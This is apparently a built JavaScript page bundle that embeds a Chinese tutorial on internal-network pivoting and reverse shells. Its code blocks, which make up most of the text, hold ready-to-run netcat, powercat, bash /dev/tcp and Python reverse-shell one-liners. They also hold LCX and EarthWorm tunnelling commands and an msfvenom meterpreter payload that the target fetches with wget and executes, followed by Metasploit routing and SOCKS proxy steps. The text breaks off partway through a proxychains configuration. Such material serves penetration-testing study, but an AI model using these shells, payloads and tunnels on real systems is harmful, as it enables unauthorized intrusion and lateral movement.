import{_ as i,W as p,X as t,Y as n,Z as s,a0 as l,a1 as a,C as r}from"./framework-b6a07282.js";const c="/assets/1-b7ca742e.jpg",o="/assets/2-67dfdf2a.jpg",d="/assets/3-56446146.jpg",u="/assets/4-b428f5b5.jpg",v="/assets/5-d9095ea9.jpg",m={},b=a(`<h2 id="内网代理" tabindex="-1"><a class="header-anchor" href="#内网代理" aria-hidden="true">#</a> 内网代理</h2><h3 id="lcx端口转发" tabindex="-1"><a class="header-anchor" href="#lcx端口转发" aria-hidden="true">#</a> LCX端口转发</h3><ul><li>windwos为lcx、linux为portmap。</li><li>LCX有端口映射和端口转发的功能。</li><li>例如当目标的3389端口只对内开放而不对外开放时，可以使用端口映射将3389端口映射到目标的其他端口使 用；当目标处于内网或目标配置的策略只允许访问固定某一端口时，可以通过端口转发突破限制。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>Windows版：
端口转发：
Lcx <span class="token parameter variable">-listen</span> <span class="token operator">&lt;</span>监听slave请求的端口<span class="token operator">&gt;</span><span class="token operator">&lt;</span>等待连接的端口<span class="token operator">&gt;</span>
Lcx <span class="token parameter variable">-slave</span> <span class="token operator">&lt;</span>攻击机IP<span class="token operator">&gt;</span><span class="token operator">&lt;</span>监听端口<span class="token operator">&gt;</span><span class="token operator">&lt;</span>目标IP<span class="token operator">&gt;</span><span class="token operator">&lt;</span>目标端口<span class="token operator">&gt;</span>
端口映射：
Lcx -tran<span class="token operator">&lt;</span>等待连接的端口<span class="token operator">&gt;</span><span class="token operator">&lt;</span>目标IP<span class="token operator">&gt;</span><span class="token operator">&lt;</span>日标端口<span class="token operator">&gt;</span>

Linux版
Usage:./portmap <span class="token parameter variable">-m</span> method <span class="token punctuation">[</span>-h1 host1<span class="token punctuation">]</span> <span class="token parameter variable">-p1</span> port1 <span class="token punctuation">[</span>-h2 host2<span class="token punctuation">]</span> <span class="token parameter variable">-p2</span> port2 <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>-log filename<span class="token punctuation">]</span>
-v: version
-h1: host1
-h2: host2
-p1: port1
-p2: port2
-log: log the data
-m: the action method <span class="token keyword">for</span> this tool
<span class="token number">1</span>: listen on PORT1 and connect to HOST2:PORT2
<span class="token number">2</span>: listen on PORT1 and PORT2
<span class="token number">3</span>: connect to HOST1:PORT1 and HOST2:PORT2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="lcx实验一" tabindex="-1"><a class="header-anchor" href="#lcx实验一" aria-hidden="true">#</a> LCX实验一</h4><img src="`+c+`"><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.在攻击机上执行以下命令
lcx.exe <span class="token parameter variable">-listen</span> <span class="token number">53</span> <span class="token number">1111</span>

<span class="token number">2</span>.在靶机上执行以下命令
lcx.exe <span class="token parameter variable">-slave</span> <span class="token number">192.168</span>.1.100 <span class="token number">53</span> <span class="token number">127.0</span>.0.1 <span class="token number">3389</span>

<span class="token number">3</span>.在攻击机上运行远程桌面连接，地址为127.0.0.1:1111
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="lcx实验二" tabindex="-1"><a class="header-anchor" href="#lcx实验二" aria-hidden="true">#</a> LCX实验二</h4><img src="`+o+`"><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.在靶机上执行以下命令
lcx.exe <span class="token parameter variable">-slave</span> <span class="token number">192.168</span>.1.253 <span class="token number">53</span> <span class="token number">127.0</span>.0.1 <span class="token number">3389</span>

<span class="token number">2</span>.在VPS上执行以下命令
./portmap <span class="token parameter variable">-m</span> <span class="token number">2</span> <span class="token parameter variable">-p1</span> <span class="token number">53</span> <span class="token parameter variable">-p2</span> <span class="token number">1111</span>

<span class="token number">3</span>.在内网机器上执行远程桌面，连接VPS的ip地址：192.168.1.253:1111
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="netcat反弹shell" tabindex="-1"><a class="header-anchor" href="#netcat反弹shell" aria-hidden="true">#</a> Netcat反弹shell</h3><ul><li>Netcat简称NC,是一个简单、可靠的网络工具,被誉为网络界的瑞士军刀。通NC可以进行端口扫描、反弹Shell、端 口监听和文件传输等操作。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>nc常用参数：
<span class="token parameter variable">-c</span> 指定连接后要执行的shell命令
<span class="token parameter variable">-e</span> 指定连接后要执行的文件名
<span class="token parameter variable">-k</span> 配置 Socket一直存活<span class="token punctuation">(</span>若不想退出 Shell后使监听断开可使用此参数<span class="token punctuation">)</span>
<span class="token parameter variable">-l</span> 监听模式
<span class="token parameter variable">-p</span> 设置本地主机使用的通信端口
<span class="token parameter variable">-u</span> 使用UDP传输协议,默认为TCP
<span class="token parameter variable">-v</span> 显示指令执行过程,用-vv会更详细
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="正向反弹shell" tabindex="-1"><a class="header-anchor" href="#正向反弹shell" aria-hidden="true">#</a> 正向反弹shell</h4><ul><li>攻击机连接靶机</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>场景：靶机有公网IP,攻击机能访问网络
<span class="token number">1</span>.在靶机上执行
<span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">1111</span> <span class="token parameter variable">-e</span> C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>cmd.exe windows机器
<span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">1111</span> <span class="token parameter variable">-e</span> /bin/bash linux机器

<span class="token number">2</span>.在攻击机上执行
<span class="token function">nc</span> 靶机IP <span class="token number">1111</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="反向反弹shell" tabindex="-1"><a class="header-anchor" href="#反向反弹shell" aria-hidden="true">#</a> 反向反弹shell</h4><ul><li>靶机连接攻击机</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>场景：靶机通过nat访问互联网，没有公网IP。攻击机有公网IP。
<span class="token number">1</span>.在攻击机上执行
<span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">1111</span>

<span class="token number">2</span>.
<span class="token function">nc</span> <span class="token parameter variable">-e</span> C:<span class="token punctuation">\\</span>Windows<span class="token punctuation">\\</span>System32<span class="token punctuation">\\</span>cmd.exe 攻击机IP <span class="token number">1111</span> windos机器
<span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash 攻击机IP <span class="token number">1111</span> linux机器
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="nc其他用法" tabindex="-1"><a class="header-anchor" href="#nc其他用法" aria-hidden="true">#</a> nc其他用法</h4><h5 id="banner的抓取" tabindex="-1"><a class="header-anchor" href="#banner的抓取" aria-hidden="true">#</a> Banner的抓取</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>查看ssh服务版本
<span class="token function">nc</span> <span class="token parameter variable">-nv</span> IP Port
nc.exe <span class="token parameter variable">-nv</span> <span class="token number">192.168</span>.1.253 <span class="token number">22</span>	
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="端口扫描" tabindex="-1"><a class="header-anchor" href="#端口扫描" aria-hidden="true">#</a> 端口扫描</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>可以查看端口的开放情况
<span class="token function">nc</span> <span class="token parameter variable">-v</span> IP Port
<span class="token function">nc</span> <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.1.253 <span class="token number">22</span>


<span class="token function">nc</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-z</span> IP Port<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>-Port<span class="token punctuation">[</span><span class="token number">65535</span><span class="token punctuation">]</span>
<span class="token function">nc</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-z</span> <span class="token number">192.168</span>.1.253 <span class="token number">1</span>-1000
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="端口监听" tabindex="-1"><a class="header-anchor" href="#端口监听" aria-hidden="true">#</a> 端口监听</h5><ul><li>当该端口被访问时会输出信息</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token parameter variable">-p</span> Port
<span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token parameter variable">-p</span> <span class="token number">80</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="文件传输" tabindex="-1"><a class="header-anchor" href="#文件传输" aria-hidden="true">#</a> 文件传输</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>接收端：
<span class="token function">nc</span> <span class="token parameter variable">-lp</span> port <span class="token operator">&gt;</span> filename
<span class="token function">nc</span> <span class="token parameter variable">-lp</span> <span class="token number">4444</span> <span class="token operator">&gt;</span> readme.txt


发送端：
<span class="token function">nc</span> <span class="token parameter variable">-vn</span> IP port <span class="token operator">&lt;</span> filename <span class="token parameter variable">-q</span> <span class="token number">1</span> <span class="token punctuation">(</span>Linux版<span class="token punctuation">)</span>
<span class="token function">nc</span> <span class="token parameter variable">-vn</span> IP port <span class="token operator">&lt;</span> filename <span class="token parameter variable">-w</span> <span class="token number">1</span> <span class="token punctuation">(</span>Windows版<span class="token punctuation">)</span>
<span class="token function">nc</span> <span class="token parameter variable">-vn</span> <span class="token number">192.168</span>.1.253 <span class="token number">4444</span> <span class="token operator">&lt;</span> readme.txt <span class="token parameter variable">-w</span> <span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="简易聊天" tabindex="-1"><a class="header-anchor" href="#简易聊天" aria-hidden="true">#</a> 简易聊天</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>A执行
<span class="token function">nc</span> <span class="token parameter variable">-lp</span> port

B端执行
<span class="token function">nc</span> <span class="token parameter variable">-vn</span> A的ip port 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="powercat反弹shell" tabindex="-1"><a class="header-anchor" href="#powercat反弹shell" aria-hidden="true">#</a> Powercat反弹shell</h3>`,32),k=n("li",null,[n("p",null,"PowerCat是一个powershell写的tcp/ip瑞士军刀，看一看成ncat的powershell的实现，然后里面也加入了众多好 用的功能，如文件上传，smb协议支持，中继模式，生成payload，端口扫描等等。")],-1),h={href:"https://github.com/besimorhino/powercat",target:"_blank",rel:"noopener noreferrer"},g=a(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.导入
Import-Module .\\powercat.ps1
2.查看帮助
powercat -h

-l 监听连接
-c 连接到侦听器
-p 要连接或监听的端口
-e 执行
-ep 执行Powershell
-r 中继。格式：“-r tcp：10.1.1.1：443”
-u 通过UDP传输数据
-dns 通过dns传输数据
-dnsft DNS故障阈值
-t 超时选项。默认值：60
-I 输入：文件路径（字符串），字节数组或字符串
-o 控制台输出类型：“主机”，“字节”或“字符串”
-of 输出文件路径
-d 连接后断开连接
-rep 中继器。断开连接后重新启动
-g 生成有效载荷
-ge 生成编码的有效载荷
-h 打印帮助消息
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="nc正向连接powercat" tabindex="-1"><a class="header-anchor" href="#nc正向连接powercat" aria-hidden="true">#</a> NC正向连接Powercat</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.靶机执行（关闭防火墙）
powercat <span class="token parameter variable">-l</span> <span class="token parameter variable">-p</span> <span class="token number">8080</span> <span class="token parameter variable">-e</span> cmd.exe <span class="token parameter variable">-v</span>

<span class="token number">2</span>.攻击机执行
<span class="token function">nc</span> <span class="token number">192.168</span>.1.1 <span class="token number">8080</span> <span class="token parameter variable">-vv</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="powercat反弹连接至nc" tabindex="-1"><a class="header-anchor" href="#powercat反弹连接至nc" aria-hidden="true">#</a> Powercat反弹连接至NC</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.靶机执行
powercat <span class="token parameter variable">-c</span> <span class="token number">192.168</span>.1.253 <span class="token parameter variable">-p</span> <span class="token number">8888</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-e</span> cmd.exe

<span class="token number">2</span>.攻击机执行
<span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token parameter variable">-p</span> <span class="token number">8888</span> <span class="token parameter variable">-vv</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="powercat反弹连接" tabindex="-1"><a class="header-anchor" href="#powercat反弹连接" aria-hidden="true">#</a> Powercat反弹连接</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.靶机执行
powercat <span class="token parameter variable">-c</span> <span class="token number">192.168</span>.1.253 <span class="token parameter variable">-p</span> <span class="token number">9999</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-ep</span>

<span class="token number">2</span>.攻击机执行
powercat <span class="token parameter variable">-l</span> <span class="token parameter variable">-p</span> <span class="token number">9999</span> <span class="token parameter variable">-v</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="powercat文件传输" tabindex="-1"><a class="header-anchor" href="#powercat文件传输" aria-hidden="true">#</a> Powercat文件传输</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.接收端
powercat <span class="token parameter variable">-l</span> <span class="token parameter variable">-p</span> <span class="token number">9999</span> <span class="token parameter variable">-of</span> shell.ps1 <span class="token parameter variable">-v</span>

<span class="token number">2</span>.发送端
powercat <span class="token parameter variable">-c</span> <span class="token number">192.168</span>.1.1 <span class="token parameter variable">-p</span> <span class="token number">9999</span> <span class="token parameter variable">-i</span> shell.ps1 <span class="token parameter variable">-v</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="用powercat生成payload" tabindex="-1"><a class="header-anchor" href="#用powercat生成payload" aria-hidden="true">#</a> 用Powercat生成payload</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.攻击机执行
powercat <span class="token parameter variable">-l</span> <span class="token parameter variable">-p</span> <span class="token number">8000</span> <span class="token parameter variable">-e</span> cmd <span class="token parameter variable">-v</span> <span class="token parameter variable">-g</span> <span class="token operator">&gt;&gt;</span> shell.ps1

<span class="token number">2</span>.靶机运行脚本
.<span class="token punctuation">\\</span>shell.ps1

<span class="token number">3</span>.攻击机正向连接
powercat <span class="token parameter variable">-c</span> <span class="token number">192.168</span>.1.1 <span class="token parameter variable">-p</span> <span class="token number">8000</span> <span class="token parameter variable">-v</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="bash反弹shell" tabindex="-1"><a class="header-anchor" href="#bash反弹shell" aria-hidden="true">#</a> Bash反弹shell</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span>/dev/tcp/攻击机_IP/攻击机端口 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span>/dev/tcp/攻击机_IP/攻击机端口 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;2</span>

<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span>/dev/udp/攻击机_IP/攻击机端口 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span>/dev/udp/攻击机_IP/攻击机端口 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;2</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>&quot;bash-i&quot;是指打开一个交互式的Shell。</li><li>&quot;&amp;&quot;符号用于区分文件和文件描述符，&quot;&gt;&amp;&quot;符号后面跟文件时，表示将标准输出和标准错误输出重定向至文 件，&quot;&gt;&amp;&quot;符号后面跟数字时表示后面的数字是文件描述符，不加&quot;&amp;&quot;符号则会把后面的数字当成文件。数 字&quot;0&quot;,&quot;1&quot;,&quot;2&quot;是LinuxShell下的文件描述符， “0”是指标准输入重定向， “1”是指标准输出重定向， “2”是指错误输出重定向。</li><li>&quot;/dev&quot;目录下&quot;tcp&quot;和&quot;udp&quot;是Linux中的特殊设备，可用于建立Socket连接，读写这俩文件就相当于是在Socket连接中传输数据。&quot;&gt;&amp;/dev/tcp/攻击机_ip/攻击机端口&quot;则表示将标准输出和标准错误输出重定向到&quot;/dev/tcp/攻击机 ip/攻击机端口&quot;文件中，也就是重定向到了攻击机，这时目标机的命令执行结果可以从攻击机看 到。&quot;0&gt;&amp;1&quot;或&quot;0&gt;&amp;2&quot;又将标准输入重定向到了标准输出，而标准输出重定向到了攻击机，因此标准输入也就重定向到了攻击机，从而可以通过攻击机输入命令，并且可以看到命令执行结果输出</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.靶机执行
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span>/dev/tcp/192.168.1.100/4444 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span>/dev/udp/192.168.1.100/4444 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>

<span class="token number">2</span>.攻击机执行
<span class="token function">nc</span> <span class="token parameter variable">-lvvp</span> <span class="token number">4444</span> <span class="token comment">#监听TCP </span>
<span class="token function">nc</span> <span class="token parameter variable">-lup</span> <span class="token number">4444</span> <span class="token comment">#监听UDP</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="python反弹shell" tabindex="-1"><a class="header-anchor" href="#python反弹shell" aria-hidden="true">#</a> Python反弹shell</h3><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#python2或3都行</span>
python <span class="token operator">-</span>c <span class="token string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.1.100&#39;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="earthworm代理" tabindex="-1"><a class="header-anchor" href="#earthworm代理" aria-hidden="true">#</a> EarthWorm代理</h3>`,18),x=n("li",null,[n("p",null,"EW 是一套便携式的网络穿透工具，具有SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Liunx、Windows、MacOS、Arm-Linux均包括其内，强烈推荐使用。")],-1),f=n("li",null,[n("p",null,"客户端：Proxifier（windwos）；ProxyChains（Linux）")],-1),_={href:"https://github.com/idlefire/ew%EF%BC%89",target:"_blank",rel:"noopener noreferrer"},P=a(`<h4 id="earthworm命令" tabindex="-1"><a class="header-anchor" href="#earthworm命令" aria-hidden="true">#</a> EarthWorm命令</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>常用命令
./ew <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token comment">#直接开启正向socks服务就可以用了</span>
./ew <span class="token parameter variable">-s</span> rcsocks <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">8888</span> //监听1080端口，1080接收的数据通过8888交互传递
./ew <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> rev_ip <span class="token parameter variable">-e</span> <span class="token number">8888</span> //开启反向socks服务，反向连接rev_ip的8888端口
./ew <span class="token parameter variable">-s</span> lcx_listen <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-e</span> <span class="token number">8888</span> //监听1080端口，1080接收的数据通过888交互传递
./ew <span class="token parameter variable">-s</span> lcx_tran <span class="token parameter variable">-l</span> <span class="token number">1080</span> <span class="token parameter variable">-f</span> forward_ip <span class="token parameter variable">-g</span> <span class="token number">8888</span> //监听1080端口，1080接收的数据正向传递给forward的8888端口
./ew <span class="token parameter variable">-s</span> lcx_slave <span class="token parameter variable">-d</span> vps_ip <span class="token parameter variable">-e</span> <span class="token number">8888</span> <span class="token parameter variable">-f</span> B_ip <span class="token parameter variable">-g</span> <span class="token number">9999</span> //作为中间角色。反向连接vps的8888，正向连接B的9999，打通两者
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="通过msf代理实现三层网络穿透" tabindex="-1"><a class="header-anchor" href="#通过msf代理实现三层网络穿透" aria-hidden="true">#</a> 通过MSF代理实现三层网络穿透</h3><img src="`+d+'"><img src="'+u+`"><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.生成对centos的木马，让centos上线。
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> linux <span class="token parameter variable">-p</span> linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.114 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-b</span> <span class="token string">&#39;\\x00\\x0a\\xff&#39;</span> <span class="token parameter variable">-i</span> <span class="token number">10</span>  <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> payload

use exploit/multi/handler
<span class="token builtin class-name">set</span> payload linux/x86/meterpreter/reverse_tcp


<span class="token number">2</span>.centos下载且执行。kail可通过python开启简易的http服务
<span class="token function">wget</span> http://192.168.0.107:8081/payload
<span class="token function">chmod</span> +x payload
./payload

<span class="token number">3</span>.centos，上线后通过命令检查centos的网卡。发现有两张网卡。
meterpreter <span class="token operator">&gt;</span> run get_local_subnets 

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
Local subnet: <span class="token number">192.168</span>.0.0/255.255.255.0
Local subnet: <span class="token number">192.168</span>.71.0/255.255.255.0

<span class="token number">4</span>.目前kail无法到达192.168.20.0网段，可通过添加静态路由来到达该网段
meterpreter <span class="token operator">&gt;</span> run autoroute <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.20.0/24

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Adding a route to <span class="token number">192.168</span>.20.0/255.255.255.0<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Added route to <span class="token number">192.168</span>.20.0/255.255.255.0 via <span class="token number">192.168</span>.0.120
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Use the <span class="token parameter variable">-p</span> option to list all active routes

meterpreter <span class="token operator">&gt;</span> run autoroute <span class="token parameter variable">-p</span> <span class="token comment">#查看路由</span>

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>

Active Routing Table
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   Subnet             Netmask            Gateway
   ------             -------            -------
   <span class="token number">192.168</span>.71.0       <span class="token number">255.255</span>.255.0      Session <span class="token number">1</span>

<span class="token number">5</span>.有了路由后配置socks代理，返回。
meterpreter <span class="token operator">&gt;</span> background 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Backgrounding session <span class="token number">2</span><span class="token punctuation">..</span>.

<span class="token number">6</span>.配置socks代理。监听本地的1080端口。
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/server/socks_proxy 

msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 

Module options <span class="token punctuation">(</span>auxiliary/server/socks_proxy<span class="token punctuation">)</span>:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  <span class="token number">127.0</span>.0.1        <span class="token function">yes</span>       The <span class="token builtin class-name">local</span> <span class="token function">host</span> or network interface to listen on. This must be an a
                                       ddress on the <span class="token builtin class-name">local</span> machine or <span class="token number">0.0</span>.0.0 to listen on all addresses.
   SRVPORT  <span class="token number">1080</span>             <span class="token function">yes</span>       The port to listen on
   VERSION  4a               <span class="token function">yes</span>       The SOCKS version to use <span class="token punctuation">(</span>Accepted: 4a, <span class="token number">5</span><span class="token punctuation">)</span>


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server

<span class="token number">7</span>.编辑/etc/proxychains.conf文件
msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token function">vim</span> /etc/proxychains4.conf
<span class="token punctuation">[</span>ProxyList<span class="token punctuation">]</span>
<span class="token comment"># add proxy here ...</span>
<span class="token comment"># meanwile</span>
